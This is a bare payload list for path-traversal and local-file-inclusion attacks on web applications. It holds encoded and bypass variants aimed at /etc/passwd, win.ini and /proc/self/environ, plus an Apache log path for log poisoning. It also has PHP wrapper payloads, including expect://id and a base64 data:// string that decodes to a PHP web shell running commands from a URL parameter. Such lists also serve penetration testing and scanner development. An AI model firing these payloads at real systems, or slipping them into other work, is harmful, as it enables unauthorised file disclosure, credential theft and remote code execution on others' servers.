../../../../etc/passwd
../../../../etc/passwd%00
../../../../etc/passwd%2500
../../../../../../../../../../etc/passwd
/etc/passwd
..\..\..\..\windows\win.ini
..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//....//etc/passwd
..%252f..%252f..%252f..%252fetc%252fpasswd
/var/log/apache2/access.log
../../../../proc/self/environ
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==
expect://id
file:///etc/passwd
/etc/passwd
\10.0.0.1\share\file.txt
C:\Windows\System32\drivers\etc\hosts
../../../../../../../../../../windows/win.ini
....//....//....//....//windows/win.ini
/var/www/html/index.php
..%252f..%252f..%252fetc%252fpasswd
